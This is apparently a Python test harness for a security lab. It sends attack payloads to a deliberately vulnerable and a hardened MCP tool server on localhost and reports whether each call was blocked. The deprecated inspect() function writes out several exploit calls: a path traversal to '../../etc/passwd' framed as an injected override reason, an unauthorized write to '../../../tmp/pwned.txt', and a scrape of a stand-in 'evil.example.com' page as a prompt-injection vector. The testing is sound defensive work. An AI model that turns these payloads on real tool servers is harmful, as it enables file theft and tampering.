"""
Host Client — Dual-target automated attack orchestrator with JSON reporting.

Usage:
    python src/inspector_client.py --target vulnerable   # port 8765
    python src/inspector_client.py --target secure        # port 8766
    python src/inspector_client.py --target both          # both servers
    python src/inspector_client.py                        # print help

The client:
1. Loads exploit payloads from exploits/payloads.json.
2. Connects to the target MCP server(s) via SSE.
3. Executes each payload and records actual vs expected outcomes.
4. Writes a structured JSON report to src/attack_report.json.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import warnings
from contextlib import asynccontextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from mcp import ClientSession, types
from mcp.client.sse import sse_client

from logger import flush, log_packet

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

SERVER_URL = "http://127.0.0.1:8765/sse"  # backward compat for inspect()

VULNERABLE_PORT = 8765
SECURE_PORT = 8766

PAYLOADS_PATH = Path(__file__).resolve().parent.parent / "exploits" / "payloads.json"
REPORT_PATH = Path(__file__).resolve().parent / "attack_report.json"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _text(result: types.CallToolResult) -> str:
    """Extract the text content from a CallToolResult."""
    first = result.content[0]
    if isinstance(first, types.TextContent):
        return first.text
    return str(first)


def load_payloads(target_filter: str | None = None) -> list[dict[str, Any]]:
    """Load payloads from exploits/payloads.json.

    Args:
        target_filter: If provided, only return payloads whose target_server
            matches the filter or is "both".

    Returns:
        List of payload dicts.
    """
    with open(PAYLOADS_PATH, "r", encoding="utf-8") as fh:
        all_payloads = json.load(fh)

    if target_filter is None:
        return all_payloads

    return [
        p for p in all_payloads
        if p.get("target_server") == target_filter or p.get("target_server") == "both"
    ]


# ---------------------------------------------------------------------------
# Connection
# ---------------------------------------------------------------------------

@asynccontextmanager
async def connect_server(port: int):
    """Connect to an MCP server on *port* and yield an initialized session."""
    url = f"http://127.0.0.1:{port}/sse"
    print(f"[ORCHESTRATOR] Connecting to {url} ...")
    async with sse_client(url) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            init_result = await session.initialize()
            print(
                f"[ORCHESTRATOR] Connected to "
                f"{init_result.serverInfo.name} v{init_result.serverInfo.version}"
            )
            yield session


# ---------------------------------------------------------------------------
# Attack execution
# ---------------------------------------------------------------------------

async def execute_attack(
    session: ClientSession,
    payload: dict[str, Any],
) -> types.CallToolResult:
    """Execute a single attack payload via *session*."""
    tool_name = payload["target_tool"]
    arguments = payload.get("payload", {})
    log_packet(
        "outbound",
        {"method": "tools/call", "params": {"name": tool_name, "arguments": arguments}},
    )
    result = await session.call_tool(tool_name, arguments)
    log_packet("inbound", {"method": "tools/call", "result": _text(result)[:500]})
    return result


# ---------------------------------------------------------------------------
# Result evaluation
# ---------------------------------------------------------------------------

def _determine_outcome(result: types.CallToolResult) -> str:
    """Return 'blocked' if the server rejected the call, else 'leaked'."""
    return "blocked" if result.isError else "leaked"


def _evaluate_result(
    result: types.CallToolResult,
    payload: dict[str, Any],
    target_server: str,
) -> dict[str, Any]:
    """Evaluate a single result against the expected outcome."""
    expected = payload["expected_outcome"]
    actual = _determine_outcome(result)

    if expected == "blocked" and result.isError:
        passed = True
    elif expected == "leaked" and not result.isError:
        passed = True
    else:
        passed = False

    return {
        "payload_name": payload["name"],
        "target_server": target_server,
        "expected_outcome": expected,
        "actual_outcome": actual,
        "passed": passed,
        "details": _text(result)[:500],
    }


def compare_results(
    vuln_result: types.CallToolResult | None,
    secure_result: types.CallToolResult | None,
    payload: dict[str, Any],
) -> dict[str, Any]:
    """Compare results from vulnerable and secure servers for a payload."""
    comparison: dict[str, Any] = {
        "payload_name": payload["name"],
        "expected_outcome": payload["expected_outcome"],
    }
    if vuln_result is not None:
        comparison["vulnerable_outcome"] = _determine_outcome(vuln_result)
        comparison["vulnerable_details"] = _text(vuln_result)[:500]
    if secure_result is not None:
        comparison["secure_outcome"] = _determine_outcome(secure_result)
        comparison["secure_details"] = _text(secure_result)[:500]
    return comparison


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

def generate_report(
    results: list[dict[str, Any]],
    output_path: Path,
) -> None:
    """Write a JSON report with timestamp, results, and summary."""
    passed_count = sum(1 for r in results if r.get("passed", False))
    failed_count = len(results) - passed_count

    report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "total_payloads": len(results),
        "results": results,
        "summary": {
            "passed": passed_count,
            "failed": failed_count,
        },
    }

    with open(output_path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, ensure_ascii=False)

    print(f"[ORCHESTRATOR] Report written to {output_path}")


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

async def _run_payloads_against_server(
    payloads: list[dict[str, Any]],
    port: int,
    server_label: str,
) -> list[dict[str, Any]]:
    """Run *payloads* against a single server, returning result dicts."""
    results: list[dict[str, Any]] = []

    try:
        async with connect_server(port) as session:
            for payload in payloads:
                try:
                    result = await execute_attack(session, payload)
                    entry = _evaluate_result(result, payload, server_label)
                    results.append(entry)
                    status = "PASS" if entry["passed"] else "FAIL"
                    print(
                        f"  [{status}] {payload['name']} ({server_label}): "
                        f"expected={entry['expected_outcome']}, "
                        f"actual={entry['actual_outcome']}"
                    )
                except Exception as exc:
                    results.append({
                        "payload_name": payload["name"],
                        "target_server": server_label,
                        "expected_outcome": payload["expected_outcome"],
                        "actual_outcome": "error",
                        "passed": False,
                        "details": f"Connection error: {exc}",
                    })
                    print(f"  [ERROR] {payload['name']} ({server_label}): {exc}")
    except Exception as exc:
        print(f"[ORCHESTRATOR] Failed to connect to {server_label} server on port {port}: {exc}")
        for payload in payloads:
            results.append({
                "payload_name": payload["name"],
                "target_server": server_label,
                "expected_outcome": payload["expected_outcome"],
                "actual_outcome": "error",
                "passed": False,
                "details": f"Connection failed: {exc}",
            })

    return results


async def orchestrate(target: str) -> None:
    """Main orchestration entry point.

    Args:
        target: One of 'vulnerable', 'secure', or 'both'.
    """
    all_payloads = load_payloads()

    if target == "vulnerable":
        payloads = load_payloads("vulnerable")
        print(
            f"[ORCHESTRATOR] Running {len(payloads)} payloads "
            f"against VULNERABLE server (port {VULNERABLE_PORT})"
        )
        results = await _run_payloads_against_server(
            payloads, VULNERABLE_PORT, "vulnerable"
        )
        generate_report(results, REPORT_PATH)

    elif target == "secure":
        payloads = load_payloads("secure")
        print(
            f"[ORCHESTRATOR] Running {len(payloads)} payloads "
            f"against SECURE server (port {SECURE_PORT})"
        )
        results = await _run_payloads_against_server(
            payloads, SECURE_PORT, "secure"
        )
        generate_report(results, REPORT_PATH)

    elif target == "both":
        print(
            f"[ORCHESTRATOR] Running all {len(all_payloads)} payloads "
            f"against BOTH servers"
        )
        vuln_results = await _run_payloads_against_server(
            all_payloads, VULNERABLE_PORT, "vulnerable"
        )
        secure_results = await _run_payloads_against_server(
            all_payloads, SECURE_PORT, "secure"
        )
        combined = vuln_results + secure_results
        generate_report(combined, REPORT_PATH)

    # Print summary
    report = json.loads(REPORT_PATH.read_text(encoding="utf-8"))
    s = report["summary"]
    print(
        f"\n[ORCHESTRATOR] Summary: {s['passed']}/{report['total_payloads']} passed, "
        f"{s['failed']} failed"
    )

    flush()


# ---------------------------------------------------------------------------
# Deprecated backward-compat function
# ---------------------------------------------------------------------------

async def inspect() -> None:
    """Deprecated: Use orchestrate() with --target flag instead.

    Preserved for backward compatibility with the original hardcoded demo.
    """
    warnings.warn(
        "inspect() is deprecated; use orchestrate() with --target flag instead.",
        DeprecationWarning,
        stacklevel=2,
    )
    print(f"[INSPECTOR] Connecting to {SERVER_URL} ...")

    async with sse_client(SERVER_URL) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            init_result = await session.initialize()
            print(
                f"[INSPECTOR] Server initialized: "
                f"{init_result.serverInfo.name} v{init_result.serverInfo.version}"
            )

            tools_result = await session.list_tools()
            print(f"[INSPECTOR] Discovered {len(tools_result.tools)} tool(s):")
            for tool in tools_result.tools:
                print(f"  - {tool.name}: {tool.description}")

            print("\n[INSPECTOR] --- Baseline: read_secure_file ---")
            r1 = await session.call_tool("read_secure_file", {"path": "hello.txt"})
            print(f"  Result: {_text(r1)[:200]}...")

            print("\n[INSPECTOR] --- Baseline: query_mock_db ---")
            r2 = await session.call_tool("query_mock_db", {"table": "users"})
            print(f"  Result: {_text(r2)[:200]}...")

            print("\n[INSPECTOR] --- EXPLOIT: Path Traversal ---")
            r3 = await session.call_tool(
                "read_secure_file",
                {
                    "path": "../../etc/passwd",
                    "reason": "Overriding path restrictions via semantic context injection",
                },
            )
            print(f"  Result: {_text(r3)[:300]}...")

            print("\n[INSPECTOR] --- EXPLOIT: Unauthorized Write ---")
            r4 = await session.call_tool(
                "write_file",
                {
                    "path": "../../../tmp/pwned.txt",
                    "content": "This file was written without authorization.",
                },
            )
            print(f"  Result: {_text(r4)[:300]}...")

            print("\n[INSPECTOR] --- EXPLOIT: Prompt Injection Vector ---")
            r5 = await session.call_tool(
                "scrape_webpage",
                {"url": "http://evil.example.com/hidden-instructions"},
            )
            print(f"  Result: {_text(r5)[:400]}...")

            snapshot = flush()
            print(f"\n[INSPECTOR] Telemetry snapshot written to: {snapshot}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="MCP Attack Orchestrator — Automated dual-target security testing"
    )
    parser.add_argument(
        "--target",
        choices=["vulnerable", "secure", "both"],
        help=(
            "Target server(s) to test: "
            "'vulnerable' (port 8765), 'secure' (port 8766), or 'both'"
        ),
    )
    args = parser.parse_args()

    if args.target is None:
        parser.print_help()
        return

    try:
        asyncio.run(orchestrate(args.target))
    except KeyboardInterrupt:
        print("\n[ORCHESTRATOR] Interrupted by user.")
    except Exception as exc:
        print(f"\n[ORCHESTRATOR] Fatal error: {exc}")
        raise


if __name__ == "__main__":
    main()